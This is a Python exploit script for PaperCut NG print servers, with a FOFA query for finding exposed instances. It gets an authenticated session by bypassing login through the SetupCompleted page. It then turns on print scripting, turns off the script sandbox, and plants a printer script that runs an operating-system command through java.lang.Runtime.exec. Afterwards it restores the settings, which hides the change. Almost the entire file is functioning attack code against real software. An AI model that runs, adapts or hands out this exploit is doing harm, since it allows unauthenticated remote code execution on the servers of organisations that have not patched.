#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import argparse
import requests
import urllib3
import time
import json
import sys
import os
import re
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning

comexec = 'whoami'


def title():
    print('+          FOFA:"PaperCut NG"')


def get_session_id(base_url):
    s = requests.Session()
    s.get(f'{base_url}/app?service=page/SetupCompleted', verify=False, timeout=(6, 6))

    headers = {'Origin': f'{base_url}'}
    data = {
        'service': 'direct/1/SetupCompleted/$Form',
        'sp': 'S0',
        'Form0': '$Hidden,analyticsEnabled,$Submit',
        '$Hidden': 'true',
        '$Submit': 'Login'
    }
    r = s.post(f'{base_url}/app', data=data, headers=headers, verify=False, timeout=(6, 6))
    if r.status_code == 200 and b'papercut' in r.content and 'JSESSIONID' in r.headers.get('Set-Cookie', ''):
        print(f'[*] Papercut instance is vulnerable! Obtained valid JSESSIONID')
        return s
    else:
        print(f'[-] Failed to get valid response, likely not vulnerable')
        return None


def set_setting(base_url, session, setting, enabled):
    print(f'[*] Updating {setting} to {enabled}')
    headers = {'Origin': f'{base_url}'}
    data = {
        'service': 'direct/1/ConfigEditor/quickFindForm',
        'sp': 'S0',
        'Form0': '$TextField,doQuickFind,clear',
        '$TextField': setting,
        'doQuickFind': 'Go'
    }
    session.post(f'{base_url}/app', data=data, headers=headers, verify=False, timeout=(6, 6))

    data = {
        'service': 'direct/1/ConfigEditor/$Form',
        'sp': 'S1',
        'Form1': '$TextField$0,$Submit,$Submit$0',
        '$TextField$0': enabled,
        '$Submit': 'Update'
    }
    session.post(f'{base_url}/app', data=data, headers=headers, verify=False, timeout=(6, 6))


def execute(base_url, session):
    print('[*] Prepparing to execute...')
    headers = {'Origin': f'{base_url}'}
    data = {
        'service': 'page/PrinterList'
    }
    session.get(f'{base_url}/app?service=page/PrinterList', data=data, headers=headers, verify=False, timeout=(6, 6))

    data = {
        'service': 'direct/1/PrinterList/selectPrinter',
        'sp': 'l1001'
    }
    session.get(f'{base_url}/app?service=direct/1/PrinterList/selectPrinter&sp=l1001', data=data, headers=headers,
                verify=False, timeout=(6, 6))

    data = {
        'service': 'direct/1/PrinterDetails/printerOptionsTab.tab',
        'sp': '4'
    }
    session.get(f'{base_url}/app', data=data, headers=headers, verify=False, timeout=(6, 6))

    data = {
        'service': 'direct/1/PrinterDetails/$PrinterDetailsScript.$Form',
        'sp': 'S0',
        'Form0': 'printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1',
        'printerId': 'l1001',
        'enablePrintScript': 'on',
        'scriptBody': "function printJobHook(inputs, actions) {}\r\n"
                      f"java.lang.Runtime.getRuntime().exec('{comexec}');",
        '$Submit$1': 'Apply',
    }
    r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False, timeout=(6, 6))
    if r.status_code == 200 and 'Saved successfully' in r.text:
        print('[+] Executed successfully!')
        return True
    else:
        print('[-] Might not have a printer configured. Exploit manually by adding one.')
        return False


def run_proto(url):
    global comexec
    headers = {
        'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/72.0.3626.121 Safari/537.36'
    }
    con_list = ["/app?service=page/SetupCompleted"]
    for con in con_list:
        check_url = url + con
        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            response = requests.get(url=check_url, headers=headers, timeout=(6, 6))
            soup = BeautifulSoup(response.text, 'html.parser')
            text_div = soup.find('div', class_='text')
            version_span = None
            for span in text_div.find_all('span'):
                version_match = re.match(r'^\d+\.\d+\.\d+$', span.text.strip())
                if version_match:
                    version_span = span
                    break
            if version_span is None:
                print('Not Vulnerable')
                return False
            else:
                sess = get_session_id(url)
                if sess:
                    set_setting(url, sess, setting='print-and-device.script.enabled', enabled='Y')
                    set_setting(url, sess, setting='print.script.sandboxed', enabled='N')
                    ifsucess = execute(url, sess)
                    set_setting(url, sess, setting='print-and-device.script.enabled', enabled='N')
                    set_setting(url, sess, setting='print.script.sandboxed', enabled='Y')
                    if ifsucess:
                        return True
                    else:
                        return False
        except Exception as e:
            print(e)
            return False
    return False


def run(target):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}'.format(proto[i], target)
        if run_proto(url):
            return True
        else:
            i = i + 1


if __name__ == '__main__':
    title()
    parse = argparse.ArgumentParser()
    parse.add_argument('-u', '--url', help='ip:port', default='127.0.0.1:9191')
    args = parse.parse_args()
    targeturl = args.url
    result = run(targeturl)

    if result:
        print('Exist')
    else:
        print('UnExist')
